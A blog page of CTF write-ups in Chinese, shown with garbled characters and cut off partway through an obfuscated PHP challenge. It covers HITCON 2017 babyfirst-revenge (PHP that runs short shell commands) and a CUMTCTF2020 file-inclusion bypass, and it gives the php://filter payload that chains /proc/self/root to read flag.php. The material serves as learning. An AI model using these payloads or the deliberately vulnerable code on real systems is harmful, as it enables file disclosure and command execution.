<!DOCTYPE html>
<html lang="en">
  <head><meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">

<meta name="description" content="å¤ç°wp"/><meta name="keywords" content="CTF" /><link rel="alternate" href="/atom.xml" title="M1key"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.0" />
<link rel="canonical" href="https://pz1o.top/2020/09/28/å¤ç°wp/"/>

<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css" /><script type="text/x-mathjax-config">
    MathJax.Hub.Config({ tex2jax: { inlineMath: [['$','$'], ['\\(','\\)']] } });
  </script>
  <script type="text/javascript" async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML"></script>
<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.11.0" />

<script id="baidu_analytics">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?ac3e804c7e07addaaf3f80f2371f03e2";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script><script id="baidu_push">
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>
<script src="//cdn1.lncld.net/static/js/3.1.1/av-min.js"></script>
  <script id="leancloud">
    AV.init({
      appId: "KLWvKGPeSIyoEo4k6j3v37wy-gzGzoHsz",
      appKey: "FL93w3BBbF9lxiR8X1HI58En"
    });
  </script><script>
  window.config = {"leancloud":{"app_id":"KLWvKGPeSIyoEo4k6j3v37wy-gzGzoHsz","app_key":"FL93w3BBbF9lxiR8X1HI58En"},"toc":true,"fancybox":true,"pjax":"","latex":true};
</script>

    <title>å¤ç°wp - M1key</title>
  <meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="M1key" type="application/atom+xml">
</head>

  <body><div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/." class="logo">M1key</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>

<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list"><a href="/">
        <li class="mobile-menu-item">Home
          </li>
      </a><a href="/archives/">
        <li class="mobile-menu-item">Archives
          </li>
      </a><a href="/tags/">
        <li class="mobile-menu-item">Tags
          </li>
      </a><a href="/about/">
        <li class="mobile-menu-item">About
          </li>
      </a></ul>
</nav>
<div class="container" id="mobile-panel">
      <header id="header" class="header"><div class="logo-wrapper">
  <a href="/." class="logo">M1key</a>
</div>

<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
          <a class="menu-item-link" href="/">
            Home
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/archives/">
            Archives
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/tags/">
            Tags
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/about/">
            About
            </a>
        </li>
      </ul></nav>
</header>

      <main id="main" class="main">
        <div class="content-wrapper">
          <div id="content" class="content"><article class="post">
    <header class="post-header">
      <h1 class="post-title">å¤ç°wp
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2020-09-28
        </span><span class="post-category">
            <a href="/categories/CTF/">CTF</a>
            </span>
        <span class="post-visits"
             data-url="/2020/09/28/%E5%A4%8D%E7%8E%B0wp/"
             data-title="å¤ç°wp">
          Visits 0
        </span>
        </div>
    </header>

    <div class="post-toc" id="post-toc">
    <h2 class="post-toc-title">Contents</h2>
    <div class="post-toc-content">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Hitcon2017-babyfirst-reveng"><span class="toc-text">Hitcon2017 babyfirst-reveng</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#è€ƒç‚¹"><span class="toc-text">è€ƒç‚¹</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CUMTCTF2020"><span class="toc-text">CUMTCTF2020</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ç®€å•çš„æ–‡ä»¶åŒ…å«ï¼Ÿ"><span class="toc-text">ç®€å•çš„æ–‡ä»¶åŒ…å«ï¼Ÿ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#è€ƒç‚¹-1"><span class="toc-text">è€ƒç‚¹</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ğŸ‘ğŸ™ŒğŸ˜ƒ"><span class="toc-text">ğŸ‘ğŸ™ŒğŸ˜ƒ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#è€ƒç‚¹-2"><span class="toc-text">è€ƒç‚¹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bcrypt"><span class="toc-text">bcrypt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#å‘½ä»¤æ‰§è¡Œ"><span class="toc-text">å‘½ä»¤æ‰§è¡Œ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EZnode"><span class="toc-text">EZnode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#è€ƒç‚¹-3"><span class="toc-text">è€ƒç‚¹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ngnix"><span class="toc-text">ngnix</span></a></li></ol></li></ol>
    </div>
  </div><div class="post-content"><a id="more"></a>
<h2 id="Hitcon2017-babyfirst-reveng"><a href="#Hitcon2017-babyfirst-reveng" class="headerlink" title="Hitcon2017 babyfirst-reveng"></a>Hitcon2017 babyfirst-reveng</h2><p>githubå¤ç°åœ°å€</p>
<p><a href="https://github.com/t3hp0rP/hitconDockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge" target="_blank" rel="noopener">https://github.com/t3hp0rP/hitconDockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge</a></p>
<h3 id="è€ƒç‚¹"><a href="#è€ƒç‚¹" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h3><p>å‘½ä»¤æ‰§è¡Œæ„é€ åå¼¹shell</p>
<p>æºç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>å…ˆè¯´å‡ ä¸ªçŸ¥è¯†ç‚¹ï¼š</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;e\</span><br><span class="line">&gt;cho\</span><br><span class="line">&#39;123&#39;</span><br><span class="line">&gt;123</span><br></pre></td></tr></table></figure>
<p>åœ¨linuxä¸­æ¢è¡Œå¯ä»¥æ‰§è¡Œé—´æ–­çš„å‘½ä»¤</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">root@kali:~<span class="comment"># vi 1  //åœ¨1ä¸‹å†™å…¥cat flag.txt</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">root@kali:~<span class="comment"># touch flag.txt</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">root@kali:~<span class="comment"># echo "cumtctf&#123;i_am_so_cute&#125;" &gt;&gt; flag.txt</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">root@kali:~<span class="comment"># cat flag.txt</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">cumtctf&#123;i_am_so_cute&#125;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">root@kali:~<span class="comment"># sh 1</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">cumtctf&#123;i_am_so_cute&#125;</span></span><br></pre></td></tr></table></figure>
<p>åœ¨Linuxä¸‹é¢å¯ä»¥é€šè¿‡å†™å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œæ–‡ä»¶é‡Œé¢çš„å†…å®¹æ˜¯ç³»ç»Ÿå‘½ä»¤ï¼Œç„¶åå¯ä»¥é€šè¿‡<code>sh filename</code>æ¥æ‰§è¡Œæ–‡æœ¬é‡Œé¢çš„ç³»ç»Ÿå‘½ä»¤ï¼Œå¦‚æœæœ‰æŠ¥é”™çš„è¯ä¼šè‡ªåŠ¨è·³è¿‡</p>
</blockquote>
<h1 id="CUMTCTF2020"><a href="#CUMTCTF2020" class="headerlink" title="CUMTCTF2020"></a>CUMTCTF2020</h1><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ç®€å•çš„æ–‡ä»¶åŒ…å«ï¼Ÿ"><a href="#ç®€å•çš„æ–‡ä»¶åŒ…å«ï¼Ÿ" class="headerlink" title="ç®€å•çš„æ–‡ä»¶åŒ…å«ï¼Ÿ"></a>ç®€å•çš„æ–‡ä»¶åŒ…å«ï¼Ÿ</h2><h3 id="è€ƒç‚¹-1"><a href="#è€ƒç‚¹-1" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h3><p>require_onceç»•è¿‡</p>
<p>æºç å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'HTTP_CLIENT_IP'</span>] != <span class="string">'127.0.0.1'</span> &amp;&amp; $_SERVER[<span class="string">'HTTP_X_REAL_IP'</span>] != <span class="string">'127.0.0.1'</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> ($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] == <span class="string">"127.0.0.1"</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Do u think that I dont know X-Forwarded-For?&lt;br&gt;Too young too simple sometimes naive"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Sorry, this site is only optimized for those who comes from localhost"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'f'</span>])) </span><br><span class="line">  <span class="keyword">include_once</span>($_POST[<span class="string">'f'</span>]);</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œä¸»è¦é—®é¢˜æ˜¯<code>reuqire_once</code>çš„é—®é¢˜</p>
<p><a href="https://www.anquanke.com/post/id/213235#h3-2" target="_blank" rel="noopener">https://www.anquanke.com/post/id/213235#h3-2</a></p>
<p>è¿™é‡Œé¢çš„æºç è§£ææœ‰å¾—è¿˜æ˜¯çœ‹ä¸æ‡‚ï¼Œæ—¥åå†ç¿»</p>
<p>é¦–å…ˆè¯´ä¸€ä¸‹phpæ–‡ä»¶åŒ…å«çš„æœºåˆ¶æ˜¯å°†<strong>å·²ç»åŒ…å«çš„æ–‡ä»¶ä¸æ–‡ä»¶çš„çœŸå®è·¯å¾„æ”¾è¿›å“ˆå¸Œè¡¨ä¸­</strong>ï¼Œå½“å·²ç»<code>require_once(&#39;flag.php&#39;)</code>ï¼Œå·²ç»includeçš„æ–‡ä»¶ä¸å¯ä»¥å†<code>require_once</code>ã€‚</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</span><br></pre></td></tr></table></figure>
<blockquote>
<p>/proc/selfæŒ‡å‘å½“å‰è¿›ç¨‹çš„/proc/pid/</p>
<p>/proc/self/root/æŒ‡å‘/çš„ç¬¦å·</p>
<p><img src="/2020/09/28/%E5%A4%8D%E7%8E%B0wp/image-20200928111221260.png" alt></p>
</blockquote>
<h2 id="ğŸ‘ğŸ™ŒğŸ˜ƒ"><a href="#ğŸ‘ğŸ™ŒğŸ˜ƒ" class="headerlink" title="ğŸ‘ğŸ™ŒğŸ˜ƒ"></a>ğŸ‘ğŸ™ŒğŸ˜ƒ</h2><h3 id="è€ƒç‚¹-2"><a href="#è€ƒç‚¹-2" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h3><p>ä»£ç æ ¼å¼åŒ–ã€åæ··æ·†ï¼Œbcryptçˆ†ç ´ï¼Œ<strong>å‘½ä»¤æ‰§è¡Œ</strong></p>
<p>è¿™ä¸ªé¢˜ æˆ‘åªèƒ½è¯´çœŸçš„ç‰›é€¼</p>
<p>çœŸçš„å¼€çœ¼ç•Œ è¿˜å¯ä»¥è¿™æ ·</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'vendor/autoload.php'</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Bcrypt</span>\<span class="title">Bcrypt</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>,<span class="string">"Off"</span>);</span><br><span class="line">$ğŸ™=<span class="keyword">array</span>(<span class="string">'ğŸ™'</span>,<span class="string">'ğŸ™‘'</span>,<span class="string">'ğŸ™’'</span>,<span class="string">'ğŸ™“'</span>,<span class="string">'ğŸ™”'</span>,<span class="string">'ğŸ™•'</span>,<span class="string">'ğŸ™–'</span>,<span class="string">'ğŸ™—'</span>,<span class="string">'ğŸ™˜'</span>,<span class="string">'ğŸ™™'</span>,<span class="string">'ğŸ™š'</span>,<span class="string">'ğŸ™›'</span>,<span class="string">'ğŸ™œ'</span>,<span class="string">'ğŸ™'</span>,<span class="string">'ğŸ™'</span>,<span class="string">'ğŸ™Ÿ'</span>);</span><br><span class="line">$ğŸ™ =<span class="keyword">array</span>(<span class="string">'ğŸ™ '</span>,<span class="string">'ğŸ™¡'</span>,<span class="string">'ğŸ™¢'</span>,<span class="string">'ğŸ™£'</span>,<span class="string">'ğŸ™¤'</span>,<span class="string">'ğŸ™¥'</span>,<span class="string">'ğŸ™¦'</span>,<span class="string">'ğŸ™§'</span>,<span class="string">'ğŸ™¨'</span>,<span class="string">'ğŸ™©'</span>,<span class="string">'ğŸ™ª'</span>,<span class="string">'ğŸ™«'</span>,<span class="string">'ğŸ™¬'</span>,<span class="string">'ğŸ™­'</span>,<span class="string">'ğŸ™®'</span>,<span class="string">'ğŸ™¯'</span>);</span><br><span class="line">$ğŸ™°=<span class="keyword">array</span>(<span class="string">'ğŸ™°'</span>,<span class="string">'ğŸ™±'</span>,<span class="string">'ğŸ™²'</span>,<span class="string">'ğŸ™³'</span>,<span class="string">'ğŸ™´'</span>,<span class="string">'ğŸ™µ'</span>,<span class="string">'ğŸ™¶'</span>,<span class="string">'ğŸ™·'</span>,<span class="string">'ğŸ™¸'</span>,<span class="string">'ğŸ™¹'</span>,<span class="string">'ğŸ™º'</span>,<span class="string">'ğŸ™»'</span>,<span class="string">'ğŸ™¼'</span>,<span class="string">'ğŸ™½'</span>,<span class="string">'ğŸ™¾'</span>,<span class="string">'ğŸ™¿'</span>);</span><br><span class="line">$ğŸ˜€=<span class="keyword">array</span>(<span class="string">'ğŸ˜€'</span>,<span class="string">'ğŸ˜'</span>,<span class="string">'ğŸ˜‚'</span>,<span class="string">'ğŸ˜ƒ'</span>,<span class="string">'ğŸ˜„'</span>,<span class="string">'ğŸ˜…'</span>,<span class="string">'ğŸ˜†'</span>,<span class="string">'ğŸ˜‡'</span>,<span class="string">'ğŸ˜ˆ'</span>,<span class="string">'ğŸ˜‰'</span>,<span class="string">'ğŸ˜Š'</span>,<span class="string">'ğŸ˜‹'</span>,<span class="string">'ğŸ˜Œ'</span>,<span class="string">'ğŸ˜'</span>,<span class="string">'ğŸ˜'</span>,<span class="string">'ğŸ˜'</span>);</span><br><span class="line">$ğŸ˜=<span class="keyword">array</span>(<span class="string">'ğŸ˜'</span>,<span class="string">'ğŸ˜‘'</span>,<span class="string">'ğŸ˜’'</span>,<span class="string">'ğŸ˜“'</span>,<span class="string">'ğŸ˜”'</span>,<span class="string">'ğŸ˜•'</span>,<span class="string">'ğŸ˜–'</span>,<span class="string">'ğŸ˜—'</span>,<span class="string">'ğŸ˜˜'</span>,<span class="string">'ğŸ˜™'</span>,<span class="string">'ğŸ˜š'</span>,<span class="string">'ğŸ˜›'</span>,<span class="string">'ğŸ˜œ'</span>,<span class="string">'ğŸ˜'</span>,<span class="string">'ğŸ˜'</span>,<span class="string">'ğŸ˜Ÿ'</span>);</span><br><span class="line">$ğŸ˜ =<span class="keyword">array</span>(<span class="string">'ğŸ˜ '</span>,<span class="string">'ğŸ˜¡'</span>,<span class="string">'ğŸ˜¢'</span>,<span class="string">'ğŸ˜£'</span>,<span class="string">'ğŸ˜¤'</span>,<span class="string">'ğŸ˜¥'</span>,<span class="string">'ğŸ˜¦'</span>,<span class="string">'ğŸ˜§'</span>,<span class="string">'ğŸ˜¨'</span>,<span class="string">'ğŸ˜©'</span>,<span class="string">'ğŸ˜ª'</span>,<span class="string">'ğŸ˜«'</span>,<span class="string">'ğŸ˜¬'</span>,<span class="string">'ğŸ˜­'</span>,<span class="string">'ğŸ˜®'</span>,<span class="string">'ğŸ˜¯'</span>);</span><br><span class="line">$ğŸ˜°=<span class="keyword">array</span>(<span class="string">'ğŸ˜°'</span>,<span class="string">'ğŸ˜±'</span>,<span class="string">'ğŸ˜²'</span>,<span class="string">'ğŸ˜³'</span>,<span class="string">'ğŸ˜´'</span>,<span class="string">'ğŸ˜µ'</span>,<span class="string">'ğŸ˜¶'</span>,<span class="string">'ğŸ˜·'</span>,<span class="string">'ğŸ˜¸'</span>,<span class="string">'ğŸ˜¹'</span>,<span class="string">'ğŸ˜º'</span>,<span class="string">'ğŸ˜»'</span>,<span class="string">'ğŸ˜¼'</span>,<span class="string">'ğŸ˜½'</span>,<span class="string">'ğŸ˜¾'</span>,<span class="string">'ğŸ˜¿'</span>);</span><br><span class="line">$ğŸ™€=<span class="keyword">array</span>(<span class="string">'ğŸ™€'</span>,<span class="string">'ğŸ™'</span>,<span class="string">'ğŸ™‚'</span>,<span class="string">'ğŸ™ƒ'</span>,<span class="string">'ğŸ™„'</span>,<span class="string">'ğŸ™…'</span>,<span class="string">'ğŸ™†'</span>,<span class="string">'ğŸ™‡'</span>,<span class="string">'ğŸ™ˆ'</span>,<span class="string">'ğŸ™‰'</span>,<span class="string">'ğŸ™Š'</span>,<span class="string">'ğŸ™‹'</span>,<span class="string">'ğŸ™Œ'</span>,<span class="string">'ğŸ™'</span>,<span class="string">'ğŸ™'</span>,<span class="string">'ğŸ™'</span>);</span><br><span class="line">$ğŸ = <span class="keyword">array</span>($ğŸ™ ,$ğŸ™ ,$ğŸ™°,$ğŸ˜€,$ğŸ˜,$ğŸ˜ ,$ğŸ˜°,$ğŸ™€);</span><br><span class="line">$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™… = <span class="string">"strlen"</span>;</span><br><span class="line">$ğŸ˜©ğŸ˜‚ğŸ˜¸ğŸ™‰ = <span class="string">"chr"</span>;</span><br><span class="line">$ğŸ = <span class="string">"base64_decode"</span>;</span><br><span class="line">$ğŸ˜±ğŸ˜¨ğŸ˜ğŸ™ŠğŸ˜ªğŸ˜¨ğŸ˜¡ğŸ˜ = <span class="string">"isset"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼<span class="params">($ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $ğŸ,$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…,$ğŸ˜©ğŸ˜‚ğŸ˜¸ğŸ™‰,$ğŸ,$ğŸ˜±ğŸ˜¨ğŸ˜ğŸ™ŠğŸ˜ªğŸ˜¨ğŸ˜¡ğŸ˜;</span><br><span class="line">	$ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…= (<span class="string">"$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…"</span>)($ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰)/<span class="number">4</span>;</span><br><span class="line">	$ğŸ˜³ğŸ˜‚ğŸ˜šğŸ˜¼ = <span class="string">""</span>;</span><br><span class="line">	<span class="keyword">for</span> ($ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€ = <span class="number">0</span>;$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€&lt;$ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…;$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€++) &#123;</span><br><span class="line">		$ğŸ˜©ğŸ˜‚ğŸ˜¦ğŸ™ƒ =$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰[$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€*<span class="number">4</span>].$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰[$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€*<span class="number">4</span>+<span class="number">1</span>].$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰[$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€*<span class="number">4</span>+<span class="number">2</span>].$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰[$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€*<span class="number">4</span>+<span class="number">3</span>];</span><br><span class="line">		$ğŸ˜ªğŸ˜¾ğŸ˜ğŸ˜€ =<span class="number">0</span>;</span><br><span class="line">		$ğŸ˜³ğŸ˜‚ğŸ˜¦ğŸ˜º =<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> ($ğŸ˜±ğŸ˜½ğŸ™€ğŸ™ =<span class="number">0</span>;$ğŸ˜±ğŸ˜½ğŸ™€ğŸ™&lt;<span class="number">8</span>;$ğŸ˜±ğŸ˜½ğŸ™€ğŸ™++) &#123;</span><br><span class="line">			<span class="keyword">for</span> ($ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚=<span class="number">0</span>;$ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚&lt;<span class="number">16</span>;$ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚++) &#123;</span><br><span class="line">				<span class="keyword">if</span>($ğŸ˜©ğŸ˜‚ğŸ˜¦ğŸ™ƒ == $ğŸ[$ğŸ˜±ğŸ˜½ğŸ™€ğŸ™][$ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚]) &#123;</span><br><span class="line">					$ğŸ˜ªğŸ˜¾ğŸ˜ğŸ˜€=$ğŸ˜±ğŸ˜½ğŸ™€ğŸ™;</span><br><span class="line">					$ğŸ˜³ğŸ˜‚ğŸ˜¦ğŸ˜º = $ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		$ğŸ˜²ğŸ˜¾ğŸ˜¦ğŸ™„ = $ğŸ˜ªğŸ˜¾ğŸ˜ğŸ˜€*<span class="number">16</span>+$ğŸ˜³ğŸ˜‚ğŸ˜¦ğŸ˜º;</span><br><span class="line">		$ğŸ˜³ğŸ˜‚ğŸ˜šğŸ˜¼ = $ğŸ˜³ğŸ˜‚ğŸ˜šğŸ˜¼.(<span class="string">"$ğŸ˜©ğŸ˜‚ğŸ˜¸ğŸ™‰"</span>)($ğŸ˜²ğŸ˜¾ğŸ˜¦ğŸ™„);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> (<span class="string">"$ğŸ"</span>)($ğŸ˜³ğŸ˜‚ğŸ˜šğŸ˜¼);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> ğŸ˜ğŸ˜<span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $ğŸ,$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…,$ğŸ˜©ğŸ˜‚ğŸ˜¸ğŸ™‰,$ğŸ,$ğŸ˜±ğŸ˜¨ğŸ˜ğŸ™ŠğŸ˜ªğŸ˜¨ğŸ˜¡ğŸ˜;</span><br><span class="line">	$ğŸ˜³ğŸ˜‚ğŸ˜–ğŸ™…ğŸ˜ªğŸ˜—ğŸ˜š = 